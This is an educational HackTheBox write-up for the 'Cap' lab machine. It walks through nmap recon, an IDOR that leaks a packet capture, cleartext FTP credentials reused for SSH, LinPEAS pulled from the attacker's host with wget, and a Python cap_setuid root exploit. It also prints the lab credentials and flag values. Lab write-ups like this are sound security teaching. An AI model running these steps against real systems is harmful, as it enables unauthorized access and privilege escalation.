# Cap - HackTheBox Walkthrough

![Cap Solved](./Cap%20Solved.png)

---

## 📋 Machine Info

- **Name:** Cap
- **IP:** 10.129.1.216
- **OS:** Linux (Ubuntu 20.04.2 LTS)
- **Difficulty:** Easy
- **Release Date:** June 5, 2021
- **Retired Date:** October 2, 2021

---

## 🔍 Reconnaissance

### What is Reconnaissance?

Reconnaissance (or "recon") is the first phase of penetration testing where we gather information about our target. Think of it like scouting before a battle - we need to know what we're dealing with!

### Initial Nmap Scan

**What is Nmap?**  
Nmap (Network Mapper) is a powerful network scanning tool that helps us discover:
- What ports are open on the target
- What services are running on those ports
- What versions of those services are installed

**Command Used:**
```bash
nu -d -p- -A 10.129.1.216
```

**Command Breakdown:**
- `nu` - Nmap Unleashed (a wrapper/alias for nmap)
- `-d` - Enable debugging (shows detailed progress)
- `-p-` - Scan ALL 65,535 ports (not just common ones)
  - `-p-` is shorthand for `-p1-65535`
  - By default, Nmap only scans ~1,000 common ports
- `-A` - Aggressive scan (enables OS detection, version detection, script scanning, and traceroute)
- `10.129.1.216` - Target IP address

**Why these flags?**
- `-d` helps us see what Nmap is doing in real-time
- `-p-` ensures we don't miss any services on uncommon ports
- `-A` gives us maximum information about each service

**Results:**
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    gunicorn
```

**Understanding the Results:**

| Port | Service | Version | What it means |
|------|---------|---------|---------------|
| **21/tcp** | FTP | vsftpd 3.0.3 | File Transfer Protocol - used for uploading/downloading files |
| **22/tcp** | SSH | OpenSSH 8.2p1 | Secure Shell - encrypted remote access to the server |
| **80/tcp** | HTTP | Gunicorn | Web server - hosts a website we can visit in our browser |

**Key Takeaway:** We found 3 open services. Each one is a potential entry point into the system!

---

## 🌐 Web Enumeration

### What is Web Enumeration?

Web enumeration is the process of exploring a web application to understand its structure, functionality, and potential vulnerabilities. We're basically mapping out the website.

### Exploring Port 80

**Why check port 80?**  
Port 80 is the standard HTTP port. If it's open, there's a website we can investigate!

**How to access it:**
```bash
# Option 1: Use a web browser
firefox http://10.129.1.216

# Option 2: Use curl from command line
curl http://10.129.1.216
```

**What I Found:**  
A "Security Dashboard" application - looks like a network monitoring tool.

**Dashboard Features:**
- Security Events: 1,560
- Failed Login Attempts: 357
- Port Scans (Unique IPs): 27
- **Important:** Logged in as user "Nathan" (we didn't even provide credentials!)

### Discovered Endpoints

**What is an endpoint?**  
An endpoint is a specific URL path on a website (like different pages or functions).

```
http://10.129.1.216/           - Main Dashboard
http://10.129.1.216/data/1     - PCAP Analysis page
```

**Why is /data/1 interesting?**  
The number "1" in the URL suggests there might be other numbers we can try (like /data/0, /data/2, etc.)

---

## 💣 IDOR Vulnerability Discovery

### What is IDOR?

**IDOR = Insecure Direct Object Reference**

This is when a website lets you access data by simply changing a number or ID in the URL, without checking if you're authorized to see it.

**Real-world example:**  
Imagine a bank website where:
- Your account: `bank.com/account/12345`
- Someone else's account: `bank.com/account/12346`

If you can just change the number and see someone else's account, that's IDOR!

### Testing the /data Endpoint

**Initial observation on /data/1:**
```
Number of Packets: 0
Number of IP Packets: 0
Number of TCP Packets: 0
Number of UDP Packets: 0
```

Empty data! Let's test if we can access other IDs.

**Testing for IDOR:**

```bash
curl http://10.129.1.216/data/0 -I
```

**Command Breakdown:**
- `curl` - Command-line tool for making HTTP requests
- `http://10.129.1.216/data/0` - URL we're testing (changed 1 to 0)
- `-I` - Show only HTTP headers (quick check)

**Result:** 
```
HTTP/1.0 200 OK
Content-Type: application/vnd.tcpdump.pcap
Content-Length: 9935
```

**Jackpot!** Different content size (9935 bytes vs 0)! This means `/data/0` has actual data!

### Downloading the PCAP File

**What is a PCAP file?**  
PCAP (Packet Capture) files contain recorded network traffic. Think of it like a recording of all network communications.

**Command to download:**
```bash
wget http://10.129.1.216/data/0 -O 0.pcap
```

**Command Breakdown:**
- `wget` - Command-line tool for downloading files
- `http://10.129.1.216/data/0` - URL of the file
- `-O 0.pcap` - Save the file as "0.pcap" (Output filename)
  - Without `-O`, it would save as just "0"
  - `.pcap` extension helps us identify it's a packet capture

**Why this is a vulnerability:**  
We just downloaded someone else's network traffic without authentication! This is a serious security flaw.

---

## 🔐 Credential Discovery

### Analyzing PCAP with Wireshark

**What is Wireshark?**  
Wireshark is like a microscope for network traffic. It lets us see every packet (data chunk) that was sent over the network.

**Command to open:**
```bash
wireshark 0.pcap
```

**How to find credentials in Wireshark:**

1. **Open the PCAP file** in Wireshark
2. **Apply a filter** to find FTP traffic:
   - In the filter bar, type: `ftp`
   - This shows only FTP-related packets
3. **Look for authentication packets:**
   - `USER` command - shows the username
   - `PASS` command - shows the password

**What I Found:**

```
Packet #40: Request: USER nathan
Packet #41: Response: 331 Please specify the password.
Packet #42: Request: PASS Buck3tH4TF0RM3!
Packet #43: Response: 230 Login successful.
```

**Why can we see the password?**  
FTP (File Transfer Protocol) sends data in **cleartext** (unencrypted). It's like sending a postcard instead of a sealed letter - anyone can read it!

**Credentials Found:**
```
Username: nathan
Password: Buck3tH4TF0RM3!
```

**Learning Point:** This is why we should NEVER use FTP for sensitive data. Always use encrypted alternatives like SFTP or FTPS.

---

## 🚪 Initial Access - SSH

### What is SSH?

**SSH (Secure Shell)** is an encrypted protocol for remote access to a computer. Unlike FTP, SSH encrypts all communication, so passwords can't be intercepted.

### Testing Credential Reuse

**What is credential reuse?**  
Many users make the mistake of using the same username/password across multiple services. Let's test if Nathan used the same FTP password for SSH!

**Command:**
```bash
ssh nathan@10.129.1.216
```

**Command Breakdown:**
- `ssh` - Secure Shell client
- `nathan` - Username we're trying to log in as
- `@` - Separator between username and host
- `10.129.1.216` - Target IP address

**When prompted, enter password:** `Buck3tH4TF0RM3!`

**Success! We're in! 🎉**

```
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

System information as of Thu Feb 12 18:58:02 UTC 2026

  System load:           0.0
  Usage of /:            36.8% of 8.73GB
  Memory usage:          21%
  Swap usage:            0%
  Processes:             222
  Users logged in:       0
  IPv4 address for eth0: 10.129.1.216

Last login: Thu May 27 11:21:27 2021 from 10.10.14.7
nathan@cap:~$
```

**Understanding the prompt:**
- `nathan` - Current username
- `cap` - Machine hostname
- `~` - Current directory (~ means home directory)
- `$` - Regular user

### Getting the User Flag

**What is a flag?**  
In HackTheBox, flags are special strings that prove you successfully compromised the system. Think of them like "proof of completion."

**Commands:**
```bash
nathan@cap:~$ ls
linpeas.sh  snap  user.txt

nathan@cap:~$ cat user.txt
563063560656daf18f4af2402388fb90
```

**Command Breakdown:**
- `ls` - List files in current directory
- `cat user.txt` - Display contents of user.txt file
  - `cat` = concatenate (shows file contents)

**User flag captured!** ✅

---

## ⬆️ Privilege Escalation

### What is Privilege Escalation?

Right now we're user "nathan" with limited permissions. **Privilege escalation** is the process of going from a regular user to root (administrator) to gain full control of the system.

Think of it like:
- Nathan = Guest in a house (limited access)
- Root = Homeowner (access to everything)

### Enumeration with LinPEAS

**What is LinPEAS?**  
LinPEAS (Linux Privilege Escalation Awesome Script) is an automated tool that scans for privilege escalation opportunities. It's like having a checklist of 1,000+ things to check!

**Step 1: Upload LinPEAS to Target**

**On your machine:**
```bash
python3 -m http.server 8000
```

**What this does:**
- `python3 -m http.server` - Starts a simple web server
- `8000` - Port number to serve on
- This lets the target download files from your machine

**On the target machine:**
```bash
wget http://10.10.14.71:8000/linpeas.sh
```

**Command Breakdown:**
- `wget` - Download tool
- `http://10.10.14.71:8000/linpeas.sh` - URL where LinPEAS is hosted
  - `10.10.14.71` is YOUR attacker machine IP (from HackTheBox VPN)

**Step 2: Make LinPEAS executable:**
```bash
chmod +x linpeas.sh
```

**Command Breakdown:**
- `chmod` - Change file permissions
- `+x` - Add execute permission
- `linpeas.sh` - File to modify

**Why?** Downloaded files aren't executable by default. We need to give it permission to run.

**Step 3: Run LinPEAS:**
```bash
./linpeas.sh
```

**Command Breakdown:**
- `./` - Current directory
- `linpeas.sh` - Script to run

**Why the `./`?** For security reasons, Linux doesn't run programs from the current directory unless you explicitly specify `./`

### Critical Finding - Python Capabilities

**LinPEAS Output:**
```bash
╔══════════╣ Capabilities
Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```

**What are Linux Capabilities?**

Linux capabilities are a way to give specific privileges to programs without making them fully SUID (Set User ID).

**Normal permission model:**
- Regular programs run as the user who started them
- SUID programs run as the file owner (often root)

**Capabilities:**
- Fine-grained permissions
- Example: `cap_net_raw` allows creating raw network packets (for ping)

**The Critical Finding:**
```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

**Breaking this down:**
- `/usr/bin/python3.8` - The Python 3.8 program
- `cap_setuid` - **DANGEROUS!** Allows changing user ID to anyone (including root!)
- `cap_net_bind_service` - Allows binding to privileged ports (not important here)
- `+eip` - Effective, Inheritable, Permitted (capability is active)

**Why is `cap_setuid` dangerous?**  
It means Python can change its user ID to 0 (root), giving us full system access!

### Exploiting Linux Capabilities

**Where to find exploits?**  
[GTFOBins](https://gtfobins.github.io/) is a curated list of Unix binaries that can be exploited for privilege escalation.

**Searching GTFOBins:**
1. Go to https://gtfobins.github.io/
2. Search for "python"
3. Click on "Capabilities"
4. Find the `cap_setuid` section

**The Exploit:**
```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Command Breakdown:**

- `/usr/bin/python3.8` - Full path to Python (ensures we use the one with capabilities)
- `-c` - Execute Python code from command line
- `'import os; os.setuid(0); os.system("/bin/bash")'` - The malicious code:
  
  **Breaking down the Python code:**
  1. `import os` - Import the operating system module
  2. `os.setuid(0)` - Change user ID to 0 (root)
     - `0` is always the root user ID in Linux
     - This works because Python has `cap_setuid`
  3. `os.system("/bin/bash")` - Start a new bash shell
     - Since we're now root, this bash shell has root privileges!

**Executing the exploit:**
```bash
nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@cap:~#
```

**Notice the prompt change:**
- `nathan@cap:~$` (regular user)
- `root@cap:~#` (root user - notice the `#`)

**Root shell obtained!** ✅

**Verify we're root:**
```bash
root@cap:~# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)

root@cap:~# whoami
root
```

**Command Breakdown:**
- `id` - Shows user ID, group ID, and group memberships
  - `uid=0(root)` - We are root!
- `whoami` - Shows current username

### Getting the Root Flag

```bash
root@cap:~# cd /root
```
- `cd` - Change directory
- `/root` - Root user's home directory

```bash
root@cap:/root# ls
root.txt  snap
```
- `ls` - List files

```bash
root@cap:/root# cat root.txt
9b56248d5833c82982eea79e7c20cb00
```
- `cat root.txt` - Display root flag

**Root flag captured!** ✅

---

## 🔗 Attack Chain Summary

Here's the complete path we took from nothing to root:

```
1. Nmap Scan
   └─> Discovered ports 21 (FTP), 22 (SSH), 80 (HTTP)

2. Web Enumeration
   └─> Found Security Dashboard with /data endpoint

3. IDOR Testing
   └─> Tested /data/0 instead of /data/1
   └─> Found accessible PCAP file

4. PCAP Download
   └─> wget http://10.129.1.216/data/0

5. Wireshark Analysis
   └─> Found FTP credentials in cleartext
   └─> nathan:Buck3tH4TF0RM3!

6. Credential Reuse
   └─> Tested FTP password on SSH
   └─> Successfully logged in as nathan

7. User Flag
   └─> cat user.txt
   └─> 563063560656daf18f4af2402388fb90

8. Automated Enumeration
   └─> Uploaded and ran LinPEAS

9. Capability Discovery
   └─> Found Python3.8 with cap_setuid

10. Privilege Escalation
    └─> Used GTFOBins technique
    └─> Got root shell

11. Root Flag
    └─> cat /root/root.txt
    └─> 9b56248d5833c82982eea79e7c20cb00
```

---

## 🐛 Vulnerabilities Identified

| Vulnerability | CWE | Severity | Impact | Fix |
|---------------|-----|----------|--------|-----|
| **IDOR on /data endpoint** | [CWE-639](https://cwe.mitre.org/data/definitions/639.html) | HIGH | Anyone can access other users' PCAP files | Add authorization checks |
| **Cleartext FTP** | [CWE-319](https://cwe.mitre.org/data/definitions/319.html) | HIGH | Passwords visible in network traffic | Use SFTP instead |
| **Credential reuse** | [CWE-257](https://cwe.mitre.org/data/definitions/257.html) | MEDIUM | Same password works on multiple services | Enforce unique passwords |
| **Excessive capabilities** | [CWE-250](https://cwe.mitre.org/data/definitions/250.html) | CRITICAL | Python can escalate to root | Remove cap_setuid from Python |

---

**Machine Pwned!** 💀

---

[← Back to Track](../README.md) | [← Back to Main](../../README.md)



